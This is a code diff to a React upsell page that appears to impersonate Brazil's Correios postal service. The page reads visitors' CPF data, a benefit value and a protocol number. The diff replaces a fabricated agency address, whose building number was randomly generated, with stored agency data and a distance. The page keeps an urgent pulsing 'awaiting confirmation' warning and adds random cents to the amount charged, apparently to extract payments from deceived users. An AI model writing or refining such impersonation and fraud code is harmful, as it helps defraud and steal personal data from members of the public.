@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import CorreiosHeader from "@/components/CorreiosHeader";
 import CorreiosFooter from "@/components/CorreiosFooter";
 import { CPFData } from "@/lib/cpf";
-import { getSession, saveSession, CepData } from "@/hooks/useSessionPersistence";
+import { getSession, saveSession, CepData, AgencyData } from "@/hooks/useSessionPersistence";
 import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
 
@@ -21,14 +21,11 @@ interface UpsellInfoItem {
   botaoTexto: string;
 }
 
-const buildUpsellInfo = (cepData?: CepData): UpsellInfoItem[] => {
-  const agenciaNome = cepData
-    ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}`
-    : "Agência mais próxima do seu CEP";
-  const numPredial = Math.floor(Math.random() * 2000) + 100;
-  const agenciaEndereco = cepData?.logradouro
-    ? `${cepData.logradouro}, ${numPredial} — ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}`
-    : "Endereço será definido com base no seu CEP";
+const buildUpsellInfo = (cepData?: CepData, agencyData?: AgencyData): UpsellInfoItem[] => {
+  const agenciaNome = agencyData?.name
+    || (cepData ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}` : "Agência mais próxima do seu CEP");
+  const agenciaEndereco = agencyData?.endereco
+    || (cepData?.logradouro ? `${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}` : "Endereço será definido com base no seu CEP");
 
   return [
     {
@@ -242,8 +239,9 @@ const UpsellInfo = () => {
   const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
   const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
   const cepData: CepData | undefined = session?.cepData;
+  const agencyData: AgencyData | undefined = session?.agencyData;
 
-  const upsellInfo = useMemo(() => buildUpsellInfo(cepData), [cepData]);
+  const upsellInfo = useMemo(() => buildUpsellInfo(cepData, agencyData), [cepData, agencyData]);
   const info = upsellInfo[currentIndex];
 
   const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;
@@ -283,19 +281,11 @@ const UpsellInfo = () => {
             <table className="tabela-zebra">
               <thead><tr><th colSpan={2}>📍 Local de Prova Atribuído ao Seu CEP</th></tr></thead>
               <tbody>
-                {cepData ? (
-                  <>
-                    <tr><td className="font-semibold w-1/3">Agência</td><td className="font-bold">Agência {cepData.localidade} — {cepData.bairro || 'Centro'}</td></tr>
-                    <tr><td className="font-semibold">Endereço</td><td>{cepData.logradouro ? `${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}` : `Centro, ${cepData.localidade}/${cepData.uf}`}</td></tr>
-                    <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>
-                    <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
-                  </>
-                ) : (
-                  <>
-                    <tr><td className="font-semibold w-1/3">Local</td><td className="font-bold">Processando com base no seu CEP...</td></tr>
-                    <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
-                  </>
-                )}
+                <tr><td className="font-semibold w-1/3">Agência</td><td className="font-bold">{agencyData?.name || (cepData ? `Agência ${cepData.localidade} — ${cepData.bairro || 'Centro'}` : 'Processando...')}</td></tr>
+                <tr><td className="font-semibold">Endereço</td><td>{agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : 'Processando com base no seu CEP...')}</td></tr>
+                {cepData && <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>}
+                {agencyData?.distanceKm !== undefined && <tr><td className="font-semibold">Distância</td><td>{agencyData.distanceKm} km do CEP informado</td></tr>}
+                <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
               </tbody>
             </table>
           )}
